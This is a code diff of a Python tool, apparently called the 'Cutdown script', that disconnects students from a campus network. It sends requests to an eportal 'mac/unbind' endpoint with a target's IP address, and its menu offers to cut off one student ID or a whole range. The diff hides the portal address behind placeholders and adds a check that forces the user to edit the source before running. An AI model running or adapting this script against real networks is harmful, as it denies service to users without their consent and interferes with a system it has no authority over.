@@ -1,5 +1,5 @@
 import requests
-import time
+import inspect
 import json
 import sys
 
@@ -13,18 +13,18 @@ def int_to_ip(integer_value):
 def ip_to_int(ip_address:str):
     a, b, c, d = map(int, ip_address.split('.'))
     return (a << 24) + (b << 16) + (c << 8) + d
-
+# TODO: Change this function first,then delete this comment line.
 def cutdown(data:list,**kwargs):
     headers = {
         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept": "*/*",
-        "Referer": "http://xx.xx.xx.xx/"
+        "Referer": "http://XX.XX.XX.XX/" # Change this
     }
     
     def unbind_ip(ip):
-        r = requests.get(f"http://xx.xx.xx.xx:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(ip)}", headers=headers)
+        r = requests.get(f"http://XX.XX.XX.XX:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(ip)}", headers=headers) # Change this.
         if r.status_code == 200:
             response_data = json.loads(r.text[12:-2])
             if response_data['result'] == 1:
@@ -80,6 +80,9 @@ def query(datalist:list, student_id:str) -> list:
     return tmp_device
 
 def main(data_list):
+    if 'Change' in inspect.getcomments(cutdown):
+        print(f"{RED}[X] Change the source_code before you use!{RESET}")
+        sys.exit()
     data_file = input("请输入数据来源:")
     configuration(data_file, data_list)
     print(
@@ -92,7 +95,7 @@ def main(data_list):
         """
     )
 
-    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.2v{RESET}\n")
+    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.1v{RESET}\n")
 
     options = input(f"{GREEN}[*]{RESET} Welcome to the Cutdown script:\n1.单个学号断网\n2.范围学号断网\n选择:")
     if options == '1':
